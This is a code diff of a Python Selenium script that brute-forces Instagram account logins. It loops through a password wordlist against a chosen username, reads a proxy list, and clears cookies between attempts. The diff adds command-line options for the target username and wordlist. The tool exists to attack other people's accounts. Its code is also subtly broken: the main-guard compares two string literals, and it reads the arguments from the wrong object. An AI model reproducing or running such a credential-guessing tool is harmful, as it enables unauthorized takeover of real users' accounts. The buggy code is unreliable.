@@ -1,6 +1,8 @@
 from selenium import webdriver 
+import argparse
 import time
-from random import random
+import random
+
 
 url='https://www.instagram.com/accounts/login/?force_classic_login'
 proxies = open("proxies.txt","r")
@@ -10,6 +12,8 @@ for _ in proxies:
 #"https://instagram.com")
 
 def login(username,password):
+    firefox_profile = webdriver.FirefoxProfile()
+    firefox_profile.set_preference("browser.privatebrowsing.autostart", True)
     browser = webdriver.Firefox()
     browser.delete_all_cookies()
     print("[+] deleted all cookies")
@@ -22,8 +26,6 @@ def login(username,password):
             #"noProxy":None,
             "proxyType":"manual"
         }    
-    firefox_profile = webdriver.FirefoxProfile()
-    firefox_profile.set_preference("browser.privatebrowsing.autostart", True)
     browser.get(url)
     time.sleep(2)
     browser.find_element_by_xpath("//*[@id=\"id_username\"]").clear()
@@ -33,7 +35,7 @@ def login(username,password):
         browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[3]/input").click()
         return 0
         #time.sleep(5)
-    except:
+    except Exception as e:
         return 1
     
 #Not Now
@@ -42,11 +44,28 @@ def login(username,password):
 
 #goto dms
 #browser.find_element_by_xpath("/html/body/div[1]/section/nav/div[2]/div/div/div[3]/div/div[2]/a").click()
-wordlist="path to yer wordlist"
-passlist = open(wordlist,"r")
-attempt =1
-for password in passlist:
-    print(f"\n[+]attempt:{attempt} trying:{password}")
-    login(username,password)
-    attempt+=1
+#wordlist="" # path to yer workdlist
+#username = " " # username here
+
+if '__name__' =='__main__':
+    args = argparse.ArgumentParser()
+ 
+    # Adding optional argument
+    args.add_argument("-u", "--username", help = "username of the profile")
+    args.add_argument("-w", "--wordlist", help = "path to yer wordlist")
+    args.add_argument("-h", "--help", help = "\nusage:\npython3 main.py -u <username> -w <wordlist>")
+    
+    # Read arguments from command line
+    args = args.parse_args()
+    if args.username and args.wordlist:
+        username = argparse.username
+        wordlist = argparse.wordlist
+ 
+    passlist = open(wordlist,"r")
+
+    attempt =1
+    for password in passlist:
+        print(f"\n[+]attempt:{attempt} trying:{password}")
+        login(username,password)
+        attempt+=1
     
